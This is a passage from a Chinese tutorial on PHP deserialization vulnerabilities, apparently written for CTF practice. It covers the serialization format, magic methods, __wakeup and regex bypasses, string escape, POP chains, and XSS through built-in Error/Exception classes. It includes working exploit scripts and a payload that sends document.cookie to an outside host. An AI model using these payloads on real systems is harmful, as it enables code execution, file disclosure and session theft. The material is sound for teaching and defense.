啦，是不是很方便？\n0x03 常见的序列化格式\n\n二进制格式\n字节数组\njson字符串\nxml字符串\n\n0x04 案例\n数组序列化\n&lt;?php  $a = array(&#x27;hello&#x27;,&#x27;hi&#x27;);  $a_ser = serialize($a);  echo $a_ser;?&gt;\n结果：\na:2:&#123;i:0;s:5:&quot;hello&quot;;i:1;s:2:&quot;hi&quot;;&#125;\n2：表示a有两个属性i：表示int型数据；0：表示下标0s：表示string字符串数组；5：长度为5\n解析：\na - array      b - booleand - double     i - integero - common     object r - references - string     C - custom objectO - class      N - nullR - pointer    reference U - unicode string\n对象序列化\n&lt;?php    class Student&#123;        public $name;        public $age;        function __construct()&#123;            $this-&gt;name = &#x27;abab&#x27;;            $this-&gt;age = 18;        &#125;        function pr()&#123;            return $this-&gt;name;            return $this-&gt;age;        &#125;        &#125;    $stu = new Student();    $stu_ser = serialize($stu);    echo $stu_ser?&gt;\n结果：\nO:7:&quot;Student&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;abab&quot;;s:3:&quot;age&quot;;i:18;&#125;\n注：序列化后的内容只有成员变量，没有成员函数\n还有一种成员变量就是protected类型\n&lt;?php    class test&#123;        public $aa;        private $bb;        protected $cc;        function __construct()&#123;            $this-&gt;aa = &#x27;aaa&#x27;;            $this-&gt;bb = &#x27;bbb&#x27;;            $this-&gt;cc = &#x27;ccc&#x27;;        &#125;    &#125;    $d = new test();    $d_ser = serialize($d);    echo $d_ser;?&gt;\n如果是private类型，会在变量名前加上**\\x00类名\\x00**，如果是protected类型，则会加上**\\x00*\\x00**，\n这些都是不可见字符\n输出则会导致不可见字符\\x00的丢失\n结果：\nO:4:&quot;test&quot;:3:&#123;s:2:&quot;aa&quot;;s:3:&quot;aaa&quot;;s:8:&quot;testbb&quot;;s:3:&quot;bbb&quot;;s:5:&quot;*cc&quot;;s:3:&quot;ccc&quot;;&#125;\n如果需要本地存储推荐“urlencode”\nurlencode($d_ser);\n序列化函数serialize()\n首先我创一个Ctf类 里面写了三个属性 后创建了一个ctfer对象 将Ctf类里的信息进行了改变。如果后面还要用到这个对象，就可以先将这个对象进行实例化。用的时候在反序列化出来就ok了。\n\nserialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，__sleep()方法会先被调用，然后才执行序列化操作。\n可以在__sleep()方法里决定哪些属性可以被序列化。如果没有__sleep()方法则默认序列化所有属性\n实例：\n\n即__sleep()方法使 flag age 属性序列化，而name并没有被序列化。所以可以在__sleep()方法里决定哪些属性被序列化。\n0x05 访问控制修饰符\n根据访问控制修饰符的不同 序列化后的 属性长度和属性值会有所不同，所以这里简单提一下\npublic(公有) protected(受保护)     // %00*%00属性名private(私有的)       // %00类名%00属性名\nprotected属性被序列化的时候属性值会变成**%00*%00属性名**\nprivate属性被序列化的时候属性值会变成**%00类名%00属性名**\n（%00为空白符，空字符也有长度，一个空字符长度为 1）\n实例：\n&lt;?php class Ctf&#123; \tpublic $name=&#x27;Sch0lar&#x27;; \tprotected $age=&#x27;19&#x27;; \tprivate $flag=&#x27;get flag&#x27;;    &#125; $ctfer=new Ctf(); //实例化一个对象echo serialize($ctfer); ?&gt; //输出结果 O:3:&quot;Ctf&quot;:3:&#123;s:4:&quot;name&quot;;s:7:&quot;Sch0lar&quot;;s:6:&quot;*age&quot;;s:2:&quot;19&quot;;s:9:&quot;Ctfflag&quot;;s:8:&quot;get flag&quot;;&#125;\n可以看到\ns:6:&quot;*age&quot;   //*前后出现两个空白符，一个空白符长度为1，所以序列化后，该属性长度为6s:9:&quot;Ctfflag&quot;   //类名Ctf前后出现两个%00空白符，所以长度为9\n0x06 PHP-反序列化\n5.1 常见的PHP魔术方法\n__construct()，类的构造函数__destruct()，类的析构函数__call()，在对象中调用一个不可访问方法时调用__callStatic()，在静态上下文中调用一个不可访问的方法时调用__get()，读取不可访问属性的值时调用__set()，在给不可访问属性赋值时调用__isset()，当对不可访问属性调用isset()和empty()时，__isset()被调用__unset()，当对不可访问属性调用unset()时，__unset()会被调用__sleep()，执行serialize()时，先会调用这个函数__wakeup()，执行unserialize()时，先会调用这个函数__toString()，类被当成字符串时的回应方法__invoke()，当尝试以调用函数的方式调用一个对象时，__invoke()方法会被自动调用__set_state()，当调用var_export()导出类时，此静态方法会被调用__clone()，当对象复制完成时调用__debuginfo()，当转储对象以获取应显示的属性时，会被调用__autoload()，尝试加载未定义的类__serialize()，执行serialize()时，先会调用这个函数(这个和__sleep()的区别后面会详细介绍)__unserialize()，执行unserialize()时，先会调用这个函数(这个和__wakeup()的区别后面会详细介绍)\n反序列化函数unserialize()。反序列化就是将一个序列化了的对象或数组字符串，还原回去\n\n与序列化函数类似，unserialize()会检查类中是否存在一个__wakeup魔术方法\n如果存在则会先调用__wakeup()方法，再进行序列化\n可以在__wakeup()方法中对属性进行初始化、赋值或者改变。\n\n反序列化之前重新给flag属性赋值\n// 输出结果 object(Ctf)#2 (3) &#123;\t[&quot;flag&quot;]=&gt;    string(13) &quot;no flag&quot;    [&quot;name&quot;]=&gt;    string(7) &quot;Sch0lar&quot;    [&quot;age&quot;]=&gt;    string(2) &quot;18&quot;&#125;\n5.2 漏洞成因\n原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL注入，目录遍历等不可控后果。\n在反序列化的过程中自动触发了某些魔术方法。\n漏洞触发条件： unserialize函数的参数、变量可控，php文件中存在可利用的类，类中有魔术方法\n而在反序列化时，如果反序列化对象中存在魔法函数，使用unserialize()函数同时也会触发。这样，一旦我们能够控制unserialize()入口，那么就可能引发对象注入漏洞。\n5.3 序列化引擎\nphp对session的处理有三种引擎分别为php、php_serialize、php_binary.经过这三者处理后的session结构都不相同。\nphp_serialize\t-&gt;与serialize函数序列化后的结果一致php\t\t\t\t-&gt;key|serialize后的结果php_binary\t\t-&gt;键名的长度对应的ascii字符+键名+serialize()函数序列化的值默认使用php引擎\n使用php引擎的结果：\n\n使用php_serialize引擎的结果：\n\n使用php_binary引擎的结果如下\n\n其中存在不可见字符，将结果进行URL编码如下\n\n在session文件可写的情况下，可手动写入我们想要的内容,例如\n&lt;?phpini_set(&#x27;open_basedir&#x27;,&#x27;/var/www/html&#x27;);session_save_path(&#x27;/var/www/html&#x27;);session_start();highlight_file(__FILE__);include &quot;flag.php&quot;;$banner = &quot;--4ut15m--\\n&quot;;if($_SESSION[&#x27;name&#x27;]===&#x27;admin&#x27;)&#123;    echo $flag.&quot;&lt;br&gt;&quot;;&#125;else if(isset($_GET[&#x27;name&#x27;]) &amp;&amp; isset($_GET[&#x27;content&#x27;]))&#123;        if(preg_match(&#x27;/ph/i&#x27;,$_GET[&#x27;name&#x27;]))&#123;                var_dump($_GET[&#x27;name&#x27;]);            die(&#x27;over&#x27;);        &#125;else file_put_contents(&#x27;/var/www/html/&#x27;.$_GET[&#x27;name&#x27;],$banner . $_GET[&#x27;content&#x27;]);&#125;?&gt;\n该题目中可任意文件写入，故写入session文件构造name=admin.payload=|s:3:&quot;xxx&quot;;name|s:5:&quot;admin&quot;;\n\n简单说一下payload.\nbanner和payload拼接在一起后变为--4ut15m--\\n|s:3:&quot;xxx&quot;;name|s:5:&quot;admin&quot;;经php序列化引擎反序列化后就成为了\n$_SESSION=[&#x27;--4ut15m--\\n&#x27; =&gt; &#x27;xxx&#x27;, &#x27;name&#x27; =&gt; &#x27;admin&#x27;]\n0x07 反序列化绕过小Trick\n6.1 php7.1+反序列化对类属性不敏感\n我们前面说了如果变量前是protected，序列化结果会在变量名前加上\\x00*\\x00\n但在特定版本7.1以上则对于类属性不敏感，比如下面的例子即使没有\\x00*\\x00也依然会输出abc\n&lt;?phpclass test&#123;    protected $a;    public function __construct()&#123;        $this-&gt;a = &#x27;abc&#x27;;    &#125;    public function  __destruct()&#123;        echo $this-&gt;a;    &#125;&#125;unserialize(&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;);?&gt;\n6.2 绕过__wakeup\n版本：​ PHP5 &lt; 5.6.25​ PHP7 &lt; 7.0.10\n利用方式：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行\n例：\n &lt;?phpclass test&#123;    public $a;    public function __construct()&#123;        $this-&gt;a = &#x27;abc&#x27;;    &#125;    public function __wakeup()&#123;        $this-&gt;a=&#x27;666&#x27;;    &#125;    public function  __destruct()&#123;        echo $this-&gt;a;    &#125;&#125;\n如果执行unserialize(&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;);输出结果为666而把对象属性个数的值增大执行unserialize(&#x27;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;);输出结果为abc\n6.3 绕过部分正则\n正则表达式：描述了一种字符串匹配的模式（pattern），可以用来检查一个串是否含有某种子串、将匹\n配的子串替换或者从某个串中取出符合某个条件的子串等。\npreg_match(&#x27;/^O:\\d+/&#x27;)//匹配序列化字符串是否是对象字符串开头\n利用加号绕过（在url传参时注意+编码为%2B）\nserialize(array( a ) ) a为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构)\n&lt;?phpclass test&#123;    public $a;    public function __construct()&#123;        $this-&gt;a = &#x27;abc&#x27;;    &#125;    public function  __destruct()&#123;        echo $this-&gt;a.PHP_EOL;    &#125;&#125;function match($data)&#123;    if (preg_match(&#x27;/^O:\\d+/&#x27;,$data))&#123;        die(&#x27;you lose!&#x27;);    &#125;else&#123;        return $data;    &#125;&#125;$a = &#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;;// +号绕过$b = str_replace(&#x27;O:4&#x27;,&#x27;O:+4&#x27;, $a);unserialize(match($b));// serialize(array($a));unserialize(&#x27;a:1:&#123;i:0;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#125;&#x27;);\n对应 ctfshow web258\n编写脚本：\n&lt;?phpclass ctfShowUser&#123;    public $username=&#x27;xxxxxx&#x27;;    public $password=&#x27;xxxxxx&#x27;;    public $isVip=false;    public $class = &#x27;backDoor&#x27;;    public function __construct()&#123;        $this-&gt;class=new backDoor();    &#125;    public function __destruct()&#123;        $this-&gt;class-&gt;getInfo();    &#125;&#125;class backDoor&#123;    public $code=&#x27;system(&quot;cat flag.php&quot;);&#x27;;    public function getInfo()&#123;        eval($this-&gt;code);    &#125;&#125;$a = new ctfShowUser();$a = serialize($a);$a= str_replace(&#x27;O:&#x27;, &#x27;O:+&#x27;,$a);//绕过preg_matchecho urlencode($a);?&gt;    //主要是调用backDoor执行eval命令函数获取flag\n6.4 利用引用\n&lt;?phpclass test&#123;    public $a;    public $b;    public function __construct()&#123;        $this-&gt;a = &#x27;abc&#x27;;        $this-&gt;b= &amp;$this-&gt;a;    &#125;    public function  __destruct()&#123;        if($this-&gt;a===$this-&gt;b)&#123;            echo 666;        &#125;    &#125;&#125;$a = serialize(new test());\n上面这个例子将$b设置为$a的引用，可以使$a永远与$b相等\n对应于ctfshow 265\n脚本代码：\n&lt;?phpclass ctfshowAdmin&#123;    public $token;    public $password;    public function __construct($t,$p)&#123;        $this-&gt;token=$t;        $this-&gt;password = &amp;$this-&gt;token;    &#125;    public function login()&#123;        return $this-&gt;token===$this-&gt;password;    &#125;&#125;$a = serialize(new ctfshowAdmin(&#x27;123&#x27;,&#x27;123&#x27;));echo urlencode($a);?&gt;\n6.5 16进制绕过字符的过滤\nO:4:&quot;test&quot;:2:&#123;s:4:&quot;%00*%00a&quot;;s:3:&quot;abc&quot;;s:7:&quot;%00test%00b&quot;;s:3:&quot;def&quot;;&#125;可以写成O:4:&quot;test&quot;:2:&#123;S:4:&quot;\\00*\\00\\61&quot;;s:3:&quot;abc&quot;;s:7:&quot;%00test%00b&quot;;s:3:&quot;def&quot;;&#125;表示字符类型的s大写时，会被当成16进制解析。61(16进制)-&gt;97(十进制)-&gt;a(ASCII)\n&lt;?phpclass test&#123;    public $username;    public function __construct()&#123;        $this-&gt;username = &#x27;admin&#x27;;    &#125;    public function  __destruct()&#123;        echo 666;    &#125;&#125;function check($data)&#123;    if(stristr($data, &#x27;username&#x27;)!==False)&#123;        echo(&quot;你绕不过！！&quot;.PHP_EOL);    &#125;    else&#123;        return $data;    &#125;&#125;// 未作处理前$a = &#x27;O:4:&quot;test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&#x27;;$a = check($a);unserialize($a);// 做处理后 \\75是u的16进制$a = &#x27;O:4:&quot;test&quot;:1:&#123;S:8:&quot;\\\\75sername&quot;;s:5:&quot;admin&quot;;&#125;&#x27;;$a = check($a);unserialize($a);\n6.6 PHP反序列化字符逃逸\n1.过滤后字符变多（反序列化后的一个x替换成为两个）\n&lt;?phpfunction change($str)&#123;    return str_replace(&quot;x&quot;,&quot;xx&quot;,$str);&#125;$name = $_GET[&#x27;name&#x27;];$age = &quot;I am 11&quot;;$arr = array($name,$age);echo &quot;反序列化字符串：&quot;;var_dump(serialize($arr));echo &quot;&lt;br/&gt;&quot;;echo &quot;过滤后:&quot;;$old = change(serialize($arr));$new = unserialize($old);var_dump($new);echo &quot;&lt;br/&gt;此时，age=$new[1]&quot;;?&gt;\n正常输出如下\n\n添加一个x看看：\n\n这个就是将GET传入的name中的 x 改为了 xx\n正常传入不含x的name值就会正常显示\n例如：?name=mao，此时长度为3\n如果我们传入maox，正常情况下他的长度就是4，但是经过change函数的替换，变成了abcxx，导致溢\n出（长度大于4）\n进而影响下面的反序列化\n我们可以利用这一点来实现字符串逃逸\n构造：\n?name=abcxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;whoami&quot;;&#125;\n输出如下：\n\n解释：\n当我们构造name时，在abc后写18个x，而且后面 &quot;;i:1;s:4:“flag”;} 也是18的长度\n在进行change时，这里的18个x就变成了36个x，刚好符合序列化时的长度\n从而造成 &quot;;i:1;s:4:“flag”;} 溢出，前面的&quot;闭合前串，后面的;}闭合反序列化的全过程\n而先前存在的$age被舍弃（因为这里数组只有两个元素），不影响反序列化的过程\n总之，age变量被我们控制\n2.过滤后字符变少(把反序列化后的两个x替换成为一个)\n&lt;?phpfunction change($str)&#123;    return str_replace(&quot;xx&quot;,&quot;x&quot;,$str);&#125;$arr[&#x27;name&#x27;] = $_GET[&#x27;name&#x27;];$arr[&#x27;age&#x27;] = $_GET[&#x27;age&#x27;];echo &quot;反序列化字符串：&quot;;var_dump(serialize($arr));echo &quot;&lt;br/&gt;&quot;;echo &quot;过滤后:&quot;;$old = change(serialize($arr));var_dump($old);echo &quot;&lt;br/&gt;&quot;;$new = unserialize($old);var_dump($new);echo &quot;&lt;br/&gt;此时，age=&quot;;echo $new[&#x27;age&#x27;];\n\n构造：\n?name=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&amp;age=11&quot;;s:3:&quot;age&quot;;s:6:&quot;whoami&quot;;&#125;\n这里的40个x经过滤后就变为了20个x，但是在前面的长度还是40，所以后面的20个字符被”吃掉“\n注意 &quot;;s:3:“age”;s:28: 这一部分本来就有，后面的 ;s:3:“age”;s:6:“whoami”;} 为我们所构造的\nage被我们控制\nctfshow web262\n脚本：\n&lt;?phpclass message&#123;    public $from;    public $msg;    public $to;    public $token=&#x27;user&#x27;;    public function __construct($f,$m,$t)&#123;        $this-&gt;from = $f;        $this-&gt;msg = $m;        $this-&gt;to = $t;    &#125;&#125;function filter($msg)&#123;    return str_replace(&#x27;fuck&#x27;, &#x27;loveU&#x27;, $msg);&#125;$msg = new message(&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:1:&quot;c&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;,&#x27;b&#x27;,&#x27;c&#x27;);$msg_1 = serialize($msg);echo $msg_1;$msg_2 =filter($msg_1);echo $msg_2;//O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:310:&quot;loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:1:&quot;c&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:1:&quot;c&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;?&gt;\n0x08 对象注入\n对象注入\n当用户的请求在传给反序列化函数 unserialize() 之前没有被正确的过滤时就会产生漏洞。因为PHP允\n许对象序列化，攻击者就可以提交特定的序列化的字符串给一个具有该漏洞的 unserialize 函数，最终\n导致一个在该应用范围内的任意PHP对象注入。\n前提需要满足两个条件\n1、unserialize的参数可控。2、代码里有定义一个含有魔术方法的类，并且该方法里出现一些使用类成员变量作为参数的存在安全问题的函数。\n&lt;?phpclass A&#123;public $test = &quot;12345&quot;;function __destruct()&#123;echo $this-&gt;test;&#125;&#125;$a = &#x27;O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:5:&quot;23456&quot;;&#125;&#x27;;unserialize($a);?&gt;\n脚本结束时会调用**__destruct()函数**，同时会覆盖test变量输出 23456\n0x09 POP链简单介绍\n前面所讲解的序列化攻击更多的是魔术方法中出现一些利用的漏洞，因为自动调用而触发漏洞，但如果关键代码不在魔术方法中，而是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来\n简单案例MRCTF2020-Ezpop\n&lt;?php    class Modifier &#123;    protected $var;    public function append($value)&#123;        include($value);    &#125;    public function __invoke()&#123; //当尝试将对象调用为函数时触发        $this-&gt;append($this-&gt;var);    &#125;&#125;$a $bclass Show&#123;    public $source;    public $str;    public function __construct($file=&#x27;index.php&#x27;)&#123;        $this-&gt;source = $file;        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;    &#125;    public function __toString()&#123; //把类当作字符串使用时触发        return $this-&gt;str-&gt;source;    &#125;    public function __wakeup()&#123;    if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source))    &#123;            echo &quot;hacker&quot;;            $this-&gt;source = &quot;index.php&quot;;    \t&#125;    &#125;&#125;class Test&#123;    public $p;    public function __construct()&#123;        $this-&gt;p = array();    &#125;    public function __get($key)&#123; //当调用一个不存在的或者是无法访问的属性的时候被调用        $function = $this-&gt;p;        return $function();    &#125;&#125;if(isset($_GET[&#x27;pop&#x27;]))&#123;    @unserialize($_GET[&#x27;pop&#x27;]);&#125;else&#123;    $a=new Show;    highlight_file(__FILE__);&#125;?&gt;\n共有3个类，反序列化会调用__wakeup，存在于Show类__wake中的$this-&gt;source可控，也就是Show中$source变量可控\n思路：将$source构造成一个对象Show，当$source为一个对象时。就会执行Show类中的__toString\n此时将$str指向Test类\n$this-&gt;str-&gt;source：取str类中的source值，使这个值自动调用__get\n此时将$p构造成new Modifier\nreturn $function() 表示将function当作函数返回\n当类变量直接当作函数调用的时候，就会调用魔术方法__invoke\n然后将$var构造成读取源码即可\n$var = &#x27;php://filter/read=convert.base64-encode/recource=flag.php&#x27;;\npayload：\n&lt;?phpini_set(&#x27;memory_limit&#x27;,&#x27;-1&#x27;);class Modifier &#123;    protected $var = &#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file)&#123;        $this-&gt;source = $file;        $this-&gt;str = new Test();    &#125;&#125;class Test&#123;    public $p;    public function __construct()&#123;        $this-&gt;p = new Modifier();&#125;&#125;$a = new Show(&#x27;aaa&#x27;);$a = new Show($a);echo urlencode(serialize($a));?&gt;\n来自：https://www.bilibili.com/video/av4142669\n0x10 PHP原生类反序列化利用\n我们可以使用以下方法遍历一下PHP的内置类：\n&lt;?php$classes = get_declared_classes();   //返回由已定义类的名字所组成的数组foreach ($classes as $class) &#123;    $methods = get_class_methods($class);  //返回由类的方法名组成的数组    foreach ($methods as $method) &#123;        if (in_array($method, array(            &#x27;__destruct&#x27;,            &#x27;__toString&#x27;,            &#x27;__wakeup&#x27;,            &#x27;__call&#x27;,            &#x27;__callStatic&#x27;,            &#x27;__get&#x27;,            &#x27;__set&#x27;,            &#x27;__isset&#x27;,            &#x27;__unset&#x27;,            &#x27;__invoke&#x27;,            &#x27;__set_state&#x27;    // 可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类        ))) &#123;            print $class . &#x27;::&#x27; . $method . &quot;\\n&quot;;        &#125;    &#125;&#125; \nException::__wakeupException::__toStringErrorException::__wakeupErrorException::__toStringError::__wakeupError::__toStringCompileError::__wakeupCompileError::__toStringParseError::__wakeupParseError::__toStringTypeError::__wakeupTypeError::__toStringArgumentCountError::__wakeupArgumentCountError::__toStringArithmeticError::__wakeupArithmeticError::__toStringDivisionByZeroError::__wakeupDivisionByZeroError::__toStringClosedGeneratorException::__wakeupClosedGeneratorException::__toStringDateTime::__wakeup......\n其中常遇到的几个 PHP 原生类有：\n\nError\nException\nSoapClient\nDirectoryIterator\nSimpleXMLElement\nSplFileObject\n\n10.1 Error/Exception 内置类进行 XSS\nError 内置类\n\n适用于php7版本\n在开启报错的情况下\n\nError类是php的一个内置类，用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个 __toString() 的方法，常用于PHP 反序列化中。如果有个POP链走到一半就走不通了，不如尝试利用这个来做一个xss，其实我看到的还是有好一些cms会选择直接使用 echo &lt;Object&gt; 的写法，我们都知道当把对象当成字符串的时候它就会自动调用这个方法，而它会将Error以字符串的形式表达出来；那么假如有一个echo将它输出出来，而输出内容如果是我们可以控制的，那我们就可以用&lt;script&gt;标签来执行js代码了\nexample:\n&lt;?php$a = unserialize($_GET[&#x27;whoami&#x27;]);echo $a;?&gt; \n（这里可以看到是一个反序列化函数，但是没有让我们进行反序列化的类啊，这就遇到了一个反序列化但没有POP链的情况，所以只能找到PHP内置类来进行反序列化）\nPOC:\n&lt;?php$a = new Error(&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;);$b = serialize($a);echo urlencode($b);  ?&gt;// 输出：O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A26%3A%22%2Fvar%2Fwww%2Fhtml%2Ftmp%2Ftest.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D\n\n\n&lt;script&gt;标签直接被嵌入了进去，那里面的内容自然就会被当成js代码执行咯\nException类和Error类类似，用法原理都差不多，这里就不赘述了，只不过Exception类无论是在php5还是php7的环境下都能使用\nException 内置类\n\n适用于php5、7版本\n开启报错的情况下\n\nexample：\n&lt;?php$a = unserialize($_GET[&#x27;whoami&#x27;]);echo $a;?&gt; \n&lt;?php$a = new Exception(&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;);$b = serialize($a);echo urlencode($b);  ?&gt;// 输出：O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A26%3A%22%2Fvar%2Fwww%2Fhtml%2Ftmp%2Ftest.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D\n\n[BJDCTF 2nd]xss之光\n不知道为何BUU里面这道题没了，只好看着别人的说一次。\n进入题目，首先通过git泄露拿到源码：\n&lt;?php$a = $_GET[&#x27;yds_is_so_beautiful&#x27;];echo unserialize($a);\n仅看到一个反序列化函数并没有给出需要反序列化的类，这就遇到了一个反序列化但没有POP链的情况，所以只能找PHP内置类来进行反序列化。又发现有个echo，没得跑了，就是我们刚才演示的利用Error或Exception内置类进行XSS，但是查看一下题目的环境发现是PHP 5，所以我们要使用Exception类。\n由于此题是xss，所以只要xss执行window.open()就能把flag带出来，所以POC如下：\n&lt;?php$poc = new Exception(&quot;&lt;script&gt;window.open(&#x27;http://de28dfb3-f224-48d4-b579-f1ea61189930.node3.buuoj.cn/?&#x27;+document.cookie);&lt;/script&gt;&quot;);echo urlencode(serialize($poc));?&gt; // 输出O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A109%3A%22%3Cscript%3Ewindow.open%28%27http%3A%2F%2Fde28dfb3-f224-48d4-b579-f1ea61189930.node3.buuoj.cn%2F%3F%27%2Bdocument.cookie%29%3B%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D\n执行后，得到flag就在 cookie 中。\n10.2 Error/Exception 内置类绕过哈希比较\nError 类\nError 是所有PHP内部错误类的基类，该类是在PHP 7.0.0 中开始引入的。\n类摘要：\nError implements Throwable &#123;    /* 属性 */    protected string $message ;    protected int $code ;    protected string $file ;    protected int $line ;    /* 方法 */    public __construct ( string $message = &quot;&quot; , int $code = 0 , Throwable $previous = null )    final public getMessage ( ) : string    final public getPrevious ( ) : Throwable    final public getCode ( ) : mixed    final public getFile ( ) : string    final public getLine ( ) : int    final public getTrace ( ) : array    final public getTraceAsString ( ) : string    public __toString ( ) : string    final private __clone ( ) : void&#125;\n类属性：\n- message：错误消息内容- code：错误代码- file：抛出错误的文件名- line：抛出错误在该文件中的行数\n类方法：\n- `Error::__construct` — 初始化 error 对象- `Error::getMessage` — 获取错误信息- `Error::getPrevious` — 返回先前的 Throwable- `Error::getCode` — 获取错误代码- `Error::getFile` — 获取错误发生时的文件- `Error::getLine` — 获取错误发生时的行号- `Error::getTrace` — 获取调用栈（stack trace）- `Error::getTraceAsString` — 获取字符串形式的调用栈（stack trace）- `Error::__toString` — error 的字符串表达- `Error::__clone` — 克隆 error\nException 类\nException 是所有异常的基类，该类是在PHP 5.0.0 中开始引入的。\n类摘要：\nException &#123;    /* 属性 */    protected string $message ;    protected int $code ;    protected string $file ;    protected int $line ;    /* 方法 */    public __construct ( string $message = &quot;&quot; , int $code = 0 , Throwable $previous = null )    final public getMessage ( ) : string    final public getPrevious ( ) : Throwable    final public getCode ( ) : mixed    final public getFile ( ) : string    final public getLine ( ) : int    final public getTrace ( ) : array    final public getTraceAsString ( ) : string    public __toString ( ) : string    final private __clone ( ) : void&#125;\n类属性：\n- message：异常消息内容- code：异常代码- file：抛出异常的文件名- line：抛出异常在该文件中的行号\n类方法：\n- `Exception::__construct` — 异常构造函数- `Exception::getMessage` — 获取异常消息内容- `Exception::getPrevious` — 返回异常链中的前一个异常- `Exception::getCode` — 获取异常代码- `Exception::getFile` — 创建异常时的程序文件名称- `Exception::getLine` — 获取创建的异常所在文件中的行号- `Exception::getTrace` — 获取异常追踪信息- `Exception::getTraceAsString` — 获取字符串类型的异常追踪信息- `Exception::__toString` — 将异常对象转换为字符串- `Exception::__clone` — 异常克隆\n我们可以看到，在Error和Exception这两个PHP原生类中内都有 __toString 方法，这个方法用于将异常或错误对象转换为字符串。\n我们以Error为例，我们看看当触发他的 __toString 方法时会发生什么：\n&lt;?php$a = new Error(&quot;payload&quot;,1);echo $a;\n输出：\nError: payload in /var/www/html/tmp/test.php:2Stack trace:#0 &#123;main&#125;\n发现这将会以字符串的形式输出当前报错，包含当前的错误信息（”payload”）以及当前报错的行号（”2”），而传入 Error(&quot;payload&quot;,1) 中的错误代码“1”则没有输出出来。\n在来看看下一个例子：\n&lt;?php$a = new Error(&quot;payload&quot;,1);$b = new Error(&quot;payload&quot;,2);echo $a;echo &quot;\\r\\n\\r\\n&quot;;echo $b;\n输出：\nError: payload in /var/www/html/tmp/test.php:2Stack trace:#0 &#123;main&#125; Error: payload in /var/www/html/tmp/test.php:2Stack trace:#0 &#123;main&#125;\n可见，$a 和 $b 这两个错误对象本身是不同的，但是 __toString 